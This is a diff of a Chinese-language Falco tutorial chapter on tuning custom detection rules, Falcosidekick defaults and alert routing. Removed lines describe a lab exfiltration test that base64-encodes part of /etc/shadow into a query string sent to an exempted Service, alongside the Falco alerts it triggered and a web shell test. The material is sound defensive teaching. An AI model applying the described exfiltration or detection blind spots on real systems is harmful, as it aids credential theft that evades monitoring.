-2. **對被豁免的 Service 的 8080 完全開放。** 上面那行把 `/etc/shadow` 的前 24 個位元組 base64 之後塞進查詢字串送出去,規則 A 沒有任何反應。
-
-**但訊號沒有完全消失**,這一點要一起講,否則就變成危言聳聽:
-
-```text
-Warning  Read sensitive file untrusted                            proc=head  file=/etc/shadow
-Notice   Redirect STDOUT/STDIN to Network Connection in Container  proc=bash  fd.sip=10.0.47.134
-```
-
-預設規則接住了**這一次**——因為剛好讀了 `/etc/shadow`,又剛好把 fd 重導到 socket。換一個場景:一支本來就有資料庫連線的應用被植入邏輯,把查到的資料經由被豁免的對端送出去——**沒有敏感檔案被開、沒有 fd 重導、規則 A 被豁免**,三條線全部安靜。
-
-**教訓**:這就是為什麼「調校沒付出代價,就代表規則本來沒用」。一條真正在防守的規則,調校時一定要在某個地方付出偵測力;**你的工作不是把代價變成零,是把代價講清楚、寫進例外的名字裡、然後定期回來問它還需不需要。**
-
-### 地雷 6:sidekick 預設兩份副本、不給 resources,而且會擠在同一顆節點上 {#mine-6}
+**症狀**：打開 Falcosidekick 時如果沒有在 values 裡補 `resources`，查它的 pod 會看到兩份副本、`PRIO` 是 0，而且排在同一個節點：
 
 ```console
 $ kubectl -n falco get pods -l app.kubernetes.io/name=falcosidekick \
@@ -708,62 +751,42 @@ falco-falcosidekick-5f96d6d856-5zd7s   <node-b>   0
 falco-falcosidekick-5f96d6d856-8k4mt   <node-b>   0
 ```
 
-三件事同時發生:
 
-1. **`replicaCount` 預設是 2**,沒人告訴你。在一座「加裝 Falco 就把 system 節點擠爆」的叢集上,這是多出來的一倍。
-2. **chart 預設完全不給 `resources`**。不給 requests 的 pod 是 **BestEffort**,節點記憶體吃緊時是第一個被 OOM kill 的——**告警管線是整個系統裡最不該用 BestEffort 跑的東西**。
-3. **兩顆都排到同一顆節點**,chart 沒有 pod anti-affinity。那顆節點沒了,兩份副本一起沒,`replicaCount: 2` 提供的可用性是零。
+**原因**：這是 chart 的三個預設值造成的：
 
-priority 一樣是 0,跟 [Day 3 地雷 1](sprint2-day3-falco-basics.md#mine-1) 是同一個家族。但**後果不一樣**:Falco 被踢掉是「少看到事件」,sidekick 被踢掉是「事件照抓、但沒人收到」——後者從任何健康指標上都看不出來。
+1. **`replicaCount` 預設是 2**，多一倍的 pod。
+2. **預設完全不給 `resources`。** 沒補的話，沒有 requests 的 pod，QoS 等級是 BestEffort（Kubernetes 依 requests 與 limits 把 pod 分成三級，BestEffort 是最低的一級），節點記憶體吃緊時最先被 OOM kill。
+3. **沒有設定 pod anti-affinity**（讓同一組 pod 分散到不同節點的排程條件），兩份副本排到了同一個節點。那個節點掛了，兩份一起沒，`replicaCount: 2` 等於沒有備援。
 
-**修法**:手動補上 `resources`、視情況調 `replicaCount`、加 pod anti-affinity。這三項都要自己寫,chart 一個都沒給。
+`PRIO` 欄是 0，跟 Day 3 的[「Falco pod 被搶佔，DaemonSet 卻顯示全部就緒」](sprint2-day3-falco-basics.md#mine-1)是同一類問題，但後果不同：Falco 被踢掉，是少看到事件；sidekick 被踢掉，是事件照樣偵測到，卻沒有人收到，從 Falco 的健康狀態完全看不出來。
 
-### 地雷 7:把沒調校的規則接上路由,等於把問題放大送出去 {#mine-7}
+**修法**：自己補上 `resources`（步驟 3 的 values 已經補了），視需要調整 `replicaCount`，並加上 pod anti-affinity。這三項 chart 都沒有預設。
 
-接收端收到的 964 筆,按規則分:
+## 想一想
 
-```console
-   956  Unexpected outbound connection from lab workload
-     3  Shell spawned by non-runtime parent in container
-     2  Terminal shell in container
-     2  Redirect STDOUT/STDIN to Network Connection in Container
-     1  Read sensitive file untrusted
-```
+1. 同事寫了一條規則：容器連到允許清單以外的 IP 就報。他說：「我們的服務每秒才一個請求，告警量一定不大。」那個服務用 `orders.shop.svc.cluster.local` 這種完整的 Service 名稱，呼叫另一個 namespace 的服務。在他上線之前，你會提醒他先確認什麼？
+2. 為了消掉誤報，有人提議在例外裡寫 `fd.snet in (10.0.0.0/8)`，一次放行整個 10 開頭的網段。照這一章的作法，這條例外放行了哪些連線？它跟直接複用預設的 `outbound` macro，結果有什麼不同？
+3. 某天值班頻道一整晚沒有任何 Falco 告警，`kubectl get ds falco` 全部 Ready。你會依序檢查哪幾個地方，確認是真的沒事，還是告警沒送出來？
 
-**956/964 = 99.2% 是同一條規則調校前的誤報。** 真正該看的 8 筆,散落在裡面。
+## 小結
 
-這個數字有兩層意義:
-
-- **順序錯了。** 本章的順序是先接路由、後調校,所以誤報全被忠實地送到下游。**正確的順序是先讓規則在標準輸出上安靜下來,再接路由**——標準輸出是免費的,下游不是(值班頻道被洗版、呼叫器半夜叫人、日誌平台的 ingest 帳單)。
-- **步驟 3 那次無終端機的 web shell 測試就是活生生的例子**:那 12 秒的窗口裡,1 筆真告警配 36 筆誤報。**如果那 36 筆已經被路由到值班頻道,沒有人會看見那 1 筆。**
-
-**教訓**:誤報不只是「吵」——**它是把真訊號藏起來的機制。**
-
-## 帶得走的東西
-
-- **調校沒付出代價,就代表規則本來沒在守什麼。** 一條真正在防守的規則,把誤報壓下去時一定要在某個地方交出偵測力。工作不是把代價變成零,是把代價量出來、寫進例外的名字裡、定期回來問它還需不需要。
-- **在 Kubernetes 上估事件率,要先把 DNS 放大算進去。** `ndots:5` 加三個 search domain,讓一次 HTTP 請求變成六次 `connect()`。這個倍數是叢集設定決定的,換個 namespace 就變——用「應用每秒幾個請求」去推規則會吵多大聲,一定低估。
-- **複用預設 macro 之前要把它展開讀完。** 預設的 `outbound` 排除了整個私有網段,拿來用可以讓誤報一夕歸零,代價是叢集內的橫向移動整類行為從此看不見。看起來免費的調校最危險。
-- **`helm` 說成功,不等於規則生效。** 唯一可信的是 Falco pod 自己的啟動日誌:規則檔那一行要在、而且後面不能跟著 warning 區塊。淘汰的欄位會讓一條規則永遠不報,而所有健康指標全綠。
-- **告警管線多一段,就多一個「偵測正常但沒人知道」的位置。** Falco 是 DaemonSet,掛一顆只影響一顆節點;sidekick 是 Deployment,是整條鏈上唯一的集中點,而它預設跑在 BestEffort、沒有反親和性、priority 0。
+這一章用 `list`、`macro`、`rule` 寫了兩條規則，補上 Day 3 找到的兩個空白：規則 A 把允許清單當成基線，規則 B 抓容器裡的程式再開的 shell，連沒有終端機的 web shell 也抓得到。規則交給 Falco 之後，要看 Falco pod 的啟動日誌確認載入，helm 成功不算數。放進一顆正常的 pod，規則 A 每分鐘報 180 筆，大部分是 `ndots:5` 和 search 清單造成的 DNS 查詢；用兩條具名的例外調到 0，代價是對那兩個對端的連線，不論做什麼都不會再被規則 A 看見。之後遇到一條很吵的規則，先把告警依對端拆開，找出放大的來源；加例外之前，先想清楚它放行了哪些對端、從那裡可能送出什麼；接上告警路由之前，先讓規則在標準輸出上安靜下來。
 
 ## 延伸閱讀
 
-想往下深挖,從這幾份開始:
+想再深入，可以從這幾份開始：
 
-- **[規則例外(exceptions)的官方說明](https://falco.org/docs/concepts/rules/exceptions/)** —— `fields`／`comps`／`values` 三者怎麼組成一段自動接在 `condition` 後面的 `and not`,以及覆寫時 `append` 與 `replace` 的差別,對得上步驟 4 的調校。
-- **[Pod 的 DNS 設定與 ndots](https://kubernetes.io/docs/concepts/services-networking/dns-pod-service/)** —— Kubernetes 官方文件明載 pod 的 `search` 清單與 `options ndots:5`,這是地雷 4 那個六倍放大的一手來源。
-- **[Falco 規則的覆寫與追加語法](https://falco.org/docs/concepts/rules/overriding/)** —— 同名規則怎麼整條取代、只追加條件、或只追加例外值;多團隊共用規則庫時這一頁是分工的基礎。
-- **[Falco Helm chart 的參數表](https://github.com/falcosecurity/charts/tree/master/charts/falco)** —— `customRules` 的形狀(檔名對內容的 map)、`falcosidekick` 子 chart 的開關與預設值都在這裡。
-- **[Falcosidekick 專案 README](https://github.com/falcosecurity/falcosidekick)** —— 扇出的完整目的地清單(七十多種),接真實環境時從這份挑。
+- **[規則例外（exceptions）的官方說明](https://falco.org/docs/concepts/rules/exceptions/)** —— `fields`／`comps`／`values` 三者怎麼組成一段自動接在 `condition` 後面的 `and not`，以及覆寫時 `override` 底下 `append` 與 `replace` 的差別（這裡的 `append` 是 `override` 的值，不是舊版已淘汰的 `append: true`），對應步驟 6 的調校。
+- **[Pod 的 DNS 設定與 ndots](https://kubernetes.io/docs/concepts/services-networking/dns-pod-service/)** —— Kubernetes 官方文件寫明 pod 的 `search` 清單與 `options ndots:5`，步驟 4 那個六倍放大的來源。
+- **[Falco 規則的覆寫與追加語法](https://falco.org/docs/concepts/rules/overriding/)** —— 同名規則怎麼整條取代、只追加條件，或只追加例外值；多個團隊共用規則時，分工就靠這一頁。
+- **[Falco Helm chart 的參數表](https://github.com/falcosecurity/charts/tree/master/charts/falco)** —— `customRules` 的形狀（檔名對內容的 map）、`falcosidekick` 子 chart 的開關與預設值都在這裡。
+- **[Falcosidekick 專案 README](https://github.com/falcosecurity/falcosidekick)** —— 可以轉送的完整目的地清單（七十多種），接實際環境時從這份挑。
 
 ## 下一步
 
-Falco 到這裡告一段落:預設規則讀過了、兩個洞補起來了、誤報的帳算過了、告警也送得出節點。它的形狀很清楚——**在使用者空間比對規則,報給人看**。
-
-[Day 5](sprint2-day5-tetragon-basics.md) 換 Tetragon 上場,它的做法不一樣:規則寫成 Kubernetes 的自訂資源,而且**過濾可以留在核心裡**——這讓它多出一件 Falco 做不到的事。今天寫的兩條規則會留在叢集上當基準,Day 5 之後的對照都以「25 條預設加 2 條自訂」為準。
+Falco 的做法到這裡看完了：在使用者空間比對規則，把結果報給人看。[Day 5](sprint2-day5-tetragon-basics.md) 換 Tetragon，它的規則寫成 Kubernetes 的自訂資源，而且過濾可以在核心裡完成。今天的兩條規則留在叢集上，Day 5 的對照以「預設 25 條加 2 條自訂」為準。
 
 ---
 
 !!! quote ""
-    Falco 標誌為 Falco 專案之官方資產(CNCF artwork),此處作社群教學用途。
+    Falco 標誌為 Falco 專案之官方資產（CNCF artwork），此處作社群教學用途。
